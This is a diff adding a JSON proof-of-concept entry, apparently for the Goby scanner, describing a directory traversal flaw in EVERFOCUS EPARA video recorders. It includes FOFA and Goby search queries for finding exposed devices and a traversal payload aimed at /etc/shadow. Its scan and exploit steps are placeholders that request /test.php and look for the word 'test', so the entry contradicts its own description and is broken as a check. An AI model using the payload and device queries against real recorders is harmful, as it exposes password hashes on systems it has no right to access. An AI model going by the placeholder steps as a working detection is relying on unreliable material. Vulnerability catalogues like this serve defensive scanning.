@@ -1,0 +1,148 @@
+{
+  "Name": "EVERFOCUS  EPARA Directory Traversal",
+  "Description": "<p>The EPARA series recorders feature many high performance recording features. H.264 compression, support for multiple independent monitors and call monitors, as well as Pentaplex operation, synchronous mainstreaming, free DDNS support and a user-friendly GUI. Features 3GPP mobile surveillance support, eSATA support, multiple control inputs, built-in DVR time recording calculator, Gigabit Ethernet interface and multi-language support. On-screen PTZ control, fast archiving, watermarking capabilities and built-in web interface for remote configuration.</p><p>Directory traversal (also known as directory traversal/path traversal) is achieved by using . / etc. directory control sequences or absolute paths to files to access arbitrary files and directories stored on the file system, especially application source code, configuration files, important system files, etc.</p>",
+  "Product": "EVERFOCUS EPARA",
+  "Homepage": "https://www.everfocus.com/",
+  "DisclosureDate": "2022-04-03",
+  "Author": "732903873@qq.com",
+  "FofaQuery": "header=\"EPARA264-16X4\" || header=\"EPARA16D3\" || header=\"EPARA264-32X4\"||header=\"EPARA264-16X1\"",
+  "GobyQuery": "header=\"EPARA264-16X4\" || header=\"EPARA16D3\" || header=\"EPARA264-32X4\"||header=\"EPARA264-16X1\"",
+  "Level": "3",
+  "Impact": "<p>Directory traversal (also known as directory traversal/path traversal) is achieved by using . / etc. directory control sequences or absolute paths to files to access arbitrary files and directories stored on the file system, especially application source code, configuration files, important system files, etc.<br></p>",
+  "Recommendation": "<p>1. blocking access to the external network</p><p>2. can be mitigated by waf etc</p>",
+  "References": [
+    "none"
+  ],
+  "Is0day": false,
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "../../../../../../etc/shadow"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/test.php",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "test",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/test.php",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "test",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "Tags": [
+    "Directory Traversal"
+  ],
+  "VulType": [
+    "Directory Traversal"
+  ],
+  "CVEIDs": [
+    ""
+  ],
+  "CNNVD": [
+    ""
+  ],
+  "CNVD": [
+    ""
+  ],
+  "CVSSScore": "9.80",
+  "Translation": {
+    "CN": {
+      "Name": "EVERFOCUS EPARA 录像机目录穿越漏洞",
+      "Product": "EVERFOCUS EPARA",
+      "Description": "<p>EPARA系列录像机具有许多高性能记录功能。H.264压缩方式，支持多个独立的监视器和通话监视器，以及Pentaplex操作，同步主流，免费DDNS支持和用户友好的GUI。 具有 3GPP 移动监控支持、eSATA 支持、多个控制输入、内置 DVR 时间记录计算器、千兆以太网接口和多语言支持。屏幕 PTZ 控制、快速存档、水印功能和内置 Web 界面远程配置。<br></p><p><span style=\"color: rgb(64, 64, 64); font-size: 16px;\">目录穿越（也被称为目录遍历/directory traversal/path traversal）是通过使用&nbsp;</span><code class=\"docutils literal notranslate\">../</code><span style=\"color: rgb(64, 64, 64); font-size: 16px;\">&nbsp;等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。</span><br></p>",
+      "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">1、禁止外网访问</span><br></p><p>2、可以通过waf等缓解</p>",
+      "Impact": "<p><span style=\"font-size: 16px; color: rgb(64, 64, 64);\">通过使用&nbsp;</span><code class=\"docutils literal notranslate\">../</code><span style=\"font-size: 16px; color: rgb(64, 64, 64);\">&nbsp;等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。</span><br></p>",
+      "VulType": [
+        "⽬录穿越/遍历"
+      ],
+      "Tags": [
+        "⽬录穿越/遍历"
+      ]
+    },
+    "EN": {
+      "Name": "EVERFOCUS  EPARA Directory Traversal",
+      "Product": "EVERFOCUS EPARA",
+      "Description": "<p>The EPARA series recorders feature many high performance recording features. H.264 compression, support for multiple independent monitors and call monitors, as well as Pentaplex operation, synchronous mainstreaming, free DDNS support and a user-friendly GUI. Features 3GPP mobile surveillance support, eSATA support, multiple control inputs, built-in DVR time recording calculator, Gigabit Ethernet interface and multi-language support. On-screen PTZ control, fast archiving, watermarking capabilities and built-in web interface for remote configuration.</p><p>Directory traversal (also known as directory traversal/path traversal) is achieved by using . / etc. directory control sequences or absolute paths to files to access arbitrary files and directories stored on the file system, especially application source code, configuration files, important system files, etc.</p>",
+      "Recommendation": "<p>1. blocking access to the external network</p><p>2. can be mitigated by waf etc</p>",
+      "Impact": "<p>Directory traversal (also known as directory traversal/path traversal) is achieved by using . / etc. directory control sequences or absolute paths to files to access arbitrary files and directories stored on the file system, especially application source code, configuration files, important system files, etc.<br></p>",
+      "VulType": [
+        "Directory Traversal"
+      ],
+      "Tags": [
+        "Directory Traversal"
+      ]
+    }
+  },
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
